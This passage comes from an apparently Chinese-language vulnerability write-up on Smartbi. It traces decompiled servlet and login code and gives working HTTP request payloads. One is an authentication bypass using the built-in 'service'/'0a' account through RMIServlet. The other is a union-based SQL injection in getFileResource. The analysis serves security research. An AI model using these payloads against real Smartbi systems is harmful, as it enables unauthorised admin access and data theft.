(FreeQueryModule.getInstance() != <span class="hljs-literal">null</span> &amp;&amp; FreeQueryModule.getInstance().getFramework() != <span class="hljs-literal">null</span>) &#123;<br>            hasStartup = FreeQueryModule.getInstance().getFramework().isServerStartupSucceed();<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (request <span class="hljs-keyword">instanceof</span> HttpServletRequest &amp;&amp; response <span class="hljs-keyword">instanceof</span> HttpServletResponse &amp;&amp; hasStartup) &#123;<br>            <span class="hljs-keyword">if</span> (SessionLogService.getInstance().getMlogs().size() == <span class="hljs-number">0</span> &amp;&amp; SessionLogService.getInstance().getUlogs().size() == <span class="hljs-number">0</span>) &#123;<br>                chain.doFilter(request, response);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-type">boolean</span> <span class="hljs-variable">need2Log</span> <span class="hljs-operator">=</span> <span class="hljs-literal">true</span>;<br>                <span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">httpRequest</span> <span class="hljs-operator">=</span> (HttpServletRequest)request;<br>                httpRequest.setCharacterEncoding(<span class="hljs-string">&quot;UTF-8&quot;</span>);<br>                <span class="hljs-type">HttpSession</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> httpRequest.getSession(<span class="hljs-literal">false</span>);<br>                <span class="hljs-keyword">if</span> (session == <span class="hljs-literal">null</span>) &#123;<br>                    need2Log = <span class="hljs-literal">false</span>;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-type">String</span> <span class="hljs-variable">className</span> <span class="hljs-operator">=</span> httpRequest.getParameter(<span class="hljs-string">&quot;className&quot;</span>);<br>                    <span class="hljs-type">String</span> <span class="hljs-variable">methodName</span> <span class="hljs-operator">=</span> httpRequest.getParameter(<span class="hljs-string">&quot;methodName&quot;</span>);<br>                    need2Log = <span class="hljs-built_in">this</span>.checkNeedToLog(className, methodName);<br>                &#125;<br><br>                <span class="hljs-keyword">if</span> (!need2Log) &#123;<br>                    chain.doFilter(httpRequest, response);<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-type">RMILog</span> <span class="hljs-variable">rmiLog</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RMILog</span>();<br>                    <span class="hljs-type">RequestLog</span> <span class="hljs-variable">requestLog</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RequestLog</span>();<br>                    <span class="hljs-type">ResponseLog</span> <span class="hljs-variable">responseLog</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResponseLog</span>();<br>                    rmiLog.setRequest(requestLog);<br>                    rmiLog.setResponse(responseLog);<br>                    <span class="hljs-built_in">this</span>.parseRequestInfo(httpRequest, requestLog);<br>                    TraceFilter.<span class="hljs-type">WrapperedResponse</span> <span class="hljs-variable">wrapResponse</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TraceFilter</span>.WrapperedResponse(<span class="hljs-built_in">this</span>, (HttpServletResponse)response);<br>                    <span class="hljs-type">long</span> <span class="hljs-variable">startTime</span> <span class="hljs-operator">=</span> System.currentTimeMillis();<br>                    chain.doFilter(httpRequest, wrapResponse);<br>                    <span class="hljs-type">long</span> <span class="hljs-variable">duration</span> <span class="hljs-operator">=</span> System.currentTimeMillis() - startTime;<br>                    requestLog.setStart(startTime);<br>                    responseLog.setDuration(duration);<br>                    <span class="hljs-built_in">this</span>.parseResponseInfo(wrapResponse, responseLog);<br>                    SessionLogService.getInstance().addRMILog(session.getId(), rmiLog);<br>                    <span class="hljs-type">ServletOutputStream</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> response.getOutputStream();<br>                    out.write(wrapResponse.getResponseData());<br>                    out.flush();<br>                &#125;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            chain.doFilter(request, response);<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure></li><li><p>根据映射表a进⾏解密，解密出来的字符串根据  空格&#x2F;+  来拆分为三个参数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] decode(String data) &#123;<br>    <span class="hljs-type">char</span>[] ibuf = <span class="hljs-keyword">new</span> <span class="hljs-title class_">char</span>[<span class="hljs-number">4</span>];<br>    <span class="hljs-type">int</span> <span class="hljs-variable">ibufcount</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-type">byte</span>[] obuf = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[data.length() / <span class="hljs-number">4</span> * <span class="hljs-number">3</span> + <span class="hljs-number">3</span>];<br>    <span class="hljs-type">int</span> <span class="hljs-variable">obufcount</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>   <br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; data.length(); ++i) &#123;<br>        <span class="hljs-type">char</span> <span class="hljs-variable">ch</span> <span class="hljs-operator">=</span> data.charAt(i);<br>        <span class="hljs-keyword">if</span> (ch == <span class="hljs-string">&#x27;=&#x27;</span> || ch &lt; S_DECODETABLE.length &amp;&amp; S_DECODETABLE[ch] != <span class="hljs-number">127</span>) &#123;<br>            ibuf[ibufcount++] = ch;<br>            <span class="hljs-keyword">if</span> (ibufcount == ibuf.length) &#123;<br>                ibufcount = <span class="hljs-number">0</span>;<br>                obufcount += decode0(ibuf, obuf, obufcount);<br>            &#125;<br>        &#125;<br>    &#125;<br>   <br>    <span class="hljs-keyword">if</span> (obufcount == obuf.length) &#123;<br>        <span class="hljs-keyword">return</span> obuf;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-type">byte</span>[] ret = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[obufcount];<br>        System.arraycopy(obuf, <span class="hljs-number">0</span>, ret, <span class="hljs-number">0</span>, obufcount);<br>        <span class="hljs-keyword">return</span> ret;<br>    &#125;<br>&#125;<br>   <br></code></pre></td></tr></table></figure></li></ol><p><strong>直接传输</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs shell">POST /smartbi/vision/RMIServlet HTTP/1.1<br>Host: 127.0.0.1:18080<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0<br>Content-Type: application/x-www-form-urlencoded;charset=UTF-8<br>Accept: */*<br>Origin: http://127.0.0.1<br>Referer: http://127.0.0.1:18080/smartbi/vision/index.jsp<br>Accept-Encoding: gzip, deflate, br<br>Accept-Language: zh-CN,zh;q=0.9,en;q=0.8<br>Cookie: JSESSIONID=D451AE905A8C9424DE83D2C921A73D4F<br>Connection: keep-alive<br>className=UserService&amp;methodName=login&amp;params=[&quot;admin&quot;,&quot;admin&quot;]<br></code></pre></td></tr></table></figure><p>将RMIServlet解密后的三个字符串，分别传输到 classNam e 、 methodName 和 params 参数中</p><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><h2 id="内置用户登陆绕过"><a href="#内置用户登陆绕过" class="headerlink" title="内置用户登陆绕过"></a>内置用户登陆绕过</h2><p>安装时会产生内置用户，以特定接口，绕过⽤户身份认证机制，进而获得身份凭证，随后可使⽤获取的身份凭证调⽤后台接⼝，可能导致敏感信息泄露和代码执行</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java">POST /smartbi/vision/RMIServlet HTTP/<span class="hljs-number">1.1</span><br>Host: x.x.x.x<br>User-Agent: Mozilla/<span class="hljs-number">5.0</span> (Macintosh; Intel Mac OS X <span class="hljs-number">10_14_3</span>) AppleWebKit/<span class="hljs-number">60</span><br><span class="hljs-number">5.1</span><span class="hljs-number">.15</span> (KHTML, like Gecko) Version/<span class="hljs-number">12.0</span><span class="hljs-number">.3</span> Safari/<span class="hljs-number">605.1</span><span class="hljs-number">.15</span><br>Content-Type: application/x-www-form-urlencoded<br>Accept-Encoding: gzip<br>Content-Length: <span class="hljs-number">68</span><br>className=UserService&amp;methodName=loginFromDB&amp;params=[<span class="hljs-string">&quot;service&quot;</span>,<span class="hljs-string">&quot;0a&quot;</span>]<br></code></pre></td></tr></table></figure><p>解密得到的三个参数</p><h4 id="payload："><a href="#payload：" class="headerlink" title="payload："></a><strong>payload：</strong></h4><p>结果返回true—————&gt;直接利用set-cookie登录后台即可获取管理员权限</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173420964.png"></p><h4 id="漏洞分析："><a href="#漏洞分析：" class="headerlink" title="漏洞分析："></a><strong>漏洞分析：</strong></h4><ol><li><p>访问项目的web.xml，查看访问&#x2F;vision&#x2F;RMIServlet的过滤 （CheckIsLoggedFilter）</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173422702.png" alt="image-20250811182130105"></p></li><li><p>Smartbi\Tomcat\webapps\smartbi\WEB-INF\lib\smartbi-FreeQuery.jar!\smartbi\freequery\filter\CheckIsLoggedFilter.class</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173424539.png" alt="image-20250811210548785"></p><p>needToCheck ⽅法对传⼊的 类名和⽅法名 进⾏检查，判断是否需要进⾏登录 检查</p></li><li><p>查看needToCheck</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">needToCheck</span><span class="hljs-params">(String className, String methodName)</span> &#123;<br>        <span class="hljs-keyword">if</span> (!StringUtil.isNullOrEmpty(className) &amp;&amp; !className.equals(<span class="hljs-string">&quot;BIConfigService&quot;</span>)) &#123;<br>            <span class="hljs-keyword">if</span> (className.equals(<span class="hljs-string">&quot;UserService&quot;</span>) &amp;&amp; StringUtil.isInArray(methodName, <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;login&quot;</span>, <span class="hljs-string">&quot;loginFor&quot;</span>, <span class="hljs-string">&quot;clickLogin&quot;</span>, <span class="hljs-string">&quot;loginFromDB&quot;</span>, <span class="hljs-string">&quot;logout&quot;</span>, <span class="hljs-string">&quot;isLogged&quot;</span>, <span class="hljs-string">&quot;isLoginAs&quot;</span>, <span class="hljs-string">&quot;checkVersion&quot;</span>, <span class="hljs-string">&quot;hasLicense&quot;</span>&#125;)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (className.equals(<span class="hljs-string">&quot;CompositeService&quot;</span>) &amp;&amp; StringUtil.isInArray(methodName, <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;compositeLogin&quot;</span>&#125;)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (className.equals(<span class="hljs-string">&quot;BusinessViewService&quot;</span>) &amp;&amp; StringUtil.isInArray(methodName, <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;closeBusinessView&quot;</span>&#125;)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (className.equals(<span class="hljs-string">&quot;DataSourceService&quot;</span>) &amp;&amp; StringUtil.isInArray(methodName, <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;clearClientData&quot;</span>&#125;)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (className.equals(<span class="hljs-string">&quot;MDSService&quot;</span>) &amp;&amp; StringUtil.isInArray(methodName, <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;getDefaultEncryptType&quot;</span>&#125;)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (className.equals(<span class="hljs-string">&quot;MDSService&quot;</span>) &amp;&amp; StringUtil.isInArray(methodName, <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;getOAMSURL&quot;</span>&#125;)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (className.equals(<span class="hljs-string">&quot;DPPortalService&quot;</span>) &amp;&amp; StringUtil.isInArray(methodName, <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;removePageBO&quot;</span>&#125;)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (methodName.equals(<span class="hljs-string">&quot;login&quot;</span>)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (className.equals(<span class="hljs-string">&quot;CommonService&quot;</span>) &amp;&amp; StringUtil.isInArray(methodName, <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;log&quot;</span>&#125;)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">return</span> !className.equals(<span class="hljs-string">&quot;FingerTipsDataModule&quot;</span>);<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure></li><li><p>寻找调用三种参数的方式</p><p>RMIServlet 的 doPost ⽅法，接受传参，通过 processExecute ⽅法 进⾏反射调⽤⽅法</p><p>\Smartbi\Tomcat\webapps\smartbi\WEB-INF\lib\smartbi-FrameworkRMI.jar!\smartbi\framework\rmi\RMIServlet.class</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173427621.png" alt="image-20250811211750079"></p></li><li><p>跟近processExecute ⽅法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> String <span class="hljs-title function_">processExecute</span><span class="hljs-params">(HttpServletRequest request, String className, String methodName, String params)</span> &#123;<br>        <span class="hljs-type">ClientService</span> <span class="hljs-variable">service</span> <span class="hljs-operator">=</span> RMIModule.getInstance().getService(className);<span class="hljs-comment">//会根据 className 来寻找对应的 ClinetService </span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">resultStr</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">buff</span> <span class="hljs-operator">=</span> (<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>()).append(<span class="hljs-string">&#x27;&#123;&#x27;</span>);<br>            <span class="hljs-keyword">if</span> (service == <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-keyword">if</span> (className != <span class="hljs-literal">null</span>) &#123;<br>                    <span class="hljs-type">Locale</span> <span class="hljs-variable">locale</span> <span class="hljs-operator">=</span> CommonConfiguration.getInstance().getLocale();<br>                    <span class="hljs-type">String</span> <span class="hljs-variable">notFoundClass</span> <span class="hljs-operator">=</span> StringUtil.replaceLanguage(<span class="hljs-string">&quot;$&#123;Notfoundclass&#125;&quot;</span>, locale);<br>                    <span class="hljs-keyword">throw</span> (<span class="hljs-keyword">new</span> <span class="hljs-title class_">SmartbiException</span>(CommonErrorCode.UNKOWN_ERROR)).setDetail(className + <span class="hljs-string">&quot; &quot;</span> + notFoundClass);<br>                &#125;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-type">long</span> <span class="hljs-variable">startTime</span> <span class="hljs-operator">=</span> (<span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>()).getTime();<br>                <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> service.execute(methodName, <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONArray</span>(params));<br>                <span class="hljs-type">long</span> <span class="hljs-variable">duration</span> <span class="hljs-operator">=</span> (<span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>()).getTime() - startTime;<br>                <span class="hljs-keyword">if</span> (obj == <span class="hljs-literal">null</span>) &#123;<br>                    buff.append(<span class="hljs-string">&quot;\&quot;retCode\&quot;:0&quot;</span>);<br>                &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!(obj <span class="hljs-keyword">instanceof</span> Collection) &amp;&amp; !obj.getClass().isArray()) &#123;<br>                    <span class="hljs-keyword">if</span> (!(obj <span class="hljs-keyword">instanceof</span> Boolean) &amp;&amp; !(obj <span class="hljs-keyword">instanceof</span> Number)) &#123;<br>                        <span class="hljs-keyword">if</span> (obj <span class="hljs-keyword">instanceof</span> String) &#123;<br>                            buff.append(<span class="hljs-string">&quot;\&quot;retCode\&quot;:0,&quot;</span>);<br>                            buff.append(<span class="hljs-string">&quot;\&quot;result\&quot;:&quot;</span>);<br>                            JSONUtils.quote(obj.toString(), buff);<br>                        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (obj.getClass().isEnum()) &#123;<br>                            buff.append(<span class="hljs-string">&quot;\&quot;retCode\&quot;:0,&quot;</span>);<br>                            buff.append(<span class="hljs-string">&quot;\&quot;result\&quot;:&quot;</span>);<br>                            JSONUtils.quote(((Enum)obj).name(), buff);<br>                        &#125; <span class="hljs-keyword">else</span> &#123;<br>                            buff.append(<span class="hljs-string">&quot;\&quot;retCode\&quot;:0,&quot;</span>);<br>                            buff.append(<span class="hljs-string">&quot;\&quot;result\&quot;:&quot;</span>);<br>                            JSONObject.fromBeanToString(obj, buff);<br>                        &#125;<br>                    &#125; <span class="hljs-keyword">else</span> &#123;<br>                        buff.append(<span class="hljs-string">&quot;\&quot;retCode\&quot;:0,&quot;</span>);<br>                        buff.append(<span class="hljs-string">&quot;\&quot;result\&quot;:&quot;</span>);<br>                        buff.append(obj.toString());<br>                    &#125;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    buff.append(<span class="hljs-string">&quot;\&quot;retCode\&quot;:0,&quot;</span>);<br>                    buff.append(<span class="hljs-string">&quot;\&quot;result\&quot;:&quot;</span>);<br>                    JSONArray.fromObjectToString(obj, buff);<br>                &#125;<br><br>                buff.append(<span class="hljs-string">&quot;,\&quot;duration\&quot;:&quot;</span> + duration);<br>            &#125;<br><br>            buff.append(<span class="hljs-string">&#x27;&#125;&#x27;</span>);<br>            resultStr = buff.toString();<br>            RMIModule.getInstance().doCommit();<br>        &#125; <span class="hljs-keyword">catch</span> (Exception ce) &#123;<br>            <span class="hljs-keyword">if</span> (className != <span class="hljs-literal">null</span> &amp;&amp; methodName != <span class="hljs-literal">null</span>) &#123;<br>                resultStr = exceptionToString(className, methodName, ce);<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> resultStr;<br>    &#125;<br></code></pre></td></tr></table></figure></li><li><p>到UserManagerModule 的 loginFromDB 的⽅法</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173431155.png" alt="image-20250811212506631"></p></li><li><p>SecurityServiceImpl 的 loginFromDB ⽅法对传⼊的账号密码进⾏判断，如果登录成 功返回true，即可返回管理员Cookie</p><p>（其中service:0a是smartBi的内置账号）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">loginFromDB</span><span class="hljs-params">(String username, String password)</span> &#123;<br>       <span class="hljs-type">boolean</span> <span class="hljs-variable">loginSucceed</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;<br>       <span class="hljs-type">IConnectionInfo</span> <span class="hljs-variable">info</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.userManagerModule.getDaoModule().getRepository().getConnectionInfo();<br>       <span class="hljs-type">Connection</span> <span class="hljs-variable">conn</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>       <span class="hljs-type">PreparedStatement</span> <span class="hljs-variable">prep</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>       <span class="hljs-type">ResultSet</span> <span class="hljs-variable">rs</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>   <br>       <span class="hljs-keyword">try</span> &#123;<br>           conn = ConnectionPool.getInstance().getConnection(info);<br>           <span class="hljs-type">String</span> <span class="hljs-variable">sql</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;select c_userpwd from t_user where c_username=?&quot;</span>;<br>           prep = conn.prepareStatement(sql);<br>           prep.setString(<span class="hljs-number">1</span>, username);<br>           rs = prep.executeQuery();<br>           <span class="hljs-keyword">if</span> (rs.next()) &#123;<br>               <span class="hljs-type">String</span> <span class="hljs-variable">pass</span> <span class="hljs-operator">=</span> rs.getString(<span class="hljs-string">&quot;c_userpwd&quot;</span>);<br>               loginSucceed = pass != <span class="hljs-literal">null</span> &amp;&amp; pass.equals(password);<br>           &#125;<br>   <br>           rs.close();<br>           prep.close();<br>       &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>           log.error(StringUtil.getLanguageValue(<span class="hljs-string">&quot;Unabletoaccessdata&quot;</span>) + <span class="hljs-string">&quot;: &quot;</span>, e);<br>       &#125; <span class="hljs-keyword">finally</span> &#123;<br>           <span class="hljs-built_in">this</span>.closeDBObject(rs, prep, conn);<br>       &#125;<br>   <br></code></pre></td></tr></table></figure></li></ol><h2 id="sql"><a href="#sql" class="headerlink" title="sql"></a>sql</h2><h4 id="payload：（1）"><a href="#payload：（1）" class="headerlink" title="payload：（1）"></a>payload：（1）</h4><p>发包，直接获取数据库名（报错注入）</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173432983.png" alt="image-20250811215840293"></p><h4 id="漏洞分析：（1）"><a href="#漏洞分析：（1）" class="headerlink" title="漏洞分析：（1）"></a>漏洞分析：（1）</h4><ol><li><p>smartbi&#x2F;vision&#x2F;FileResource（从名称入手）</p><p>寻找FileResource相关的文件名称<strong>FileResourceServlet</strong></p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173434902.png" alt="image-20250811213747684"></p><p>从 doGet ⽅法中，利用request.getParameter(“resId”) 获取resId参数，拼接到sql语句执行<strong>（没有使⽤预编译处理）</strong></p></li><li><p>在web.xml查看相关路径的代码</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">servlet</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>FileResource<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">servlet-class</span>&gt;</span>smartbi.freequery.fileresource.FileResourceServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-class</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">servlet</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">servlet-mapping</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>FileResource<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/vision/FileResource<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">servlet-mapping</span>&gt;</span><br></code></pre></td></tr></table></figure></li><li><p>执⾏sql语句报错后，会将报错信息返回给客户端并弹窗提示，因此我们可以通过报错来进⾏注⼊</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173437858.png" alt="image-20250811215709280"></p></li></ol><h4 id="payload：（2）"><a href="#payload：（2）" class="headerlink" title="payload：（2）"></a>payload：（2）</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell">POST /smartbi/vision/RMIServlet HTTP/1.1<br>Host:127.0.0.1:18080<br>User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/60<br>5.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15<br>Content-Type: application/x-www-form-urlencoded<br>Accept-Encoding: gzip<br>Cookie: JSESSIONID=66D3B217CBE76A3BB32C771E6EB6429C<br>Content-Length: 99<br>className=UrlLinkService&amp;methodName=getFileResource&amp;params=[&quot;1&#x27;union selec<br>t database(),2,3,4,5,6#&quot;]<br></code></pre></td></tr></table></figure><p>抓包，使用union联合注入（有回显）（报错，盲注）</p><h4 id="漏洞分析：（2）"><a href="#漏洞分析：（2）" class="headerlink" title="漏洞分析：（2）"></a>漏洞分析：（2）</h4><ol><li><p>FileResourceDAO 中 getFileResource ⽅法中，这⾥我们看到 id参数为String类型，并且直接拼接到sql语句中并执⾏</p><p><img 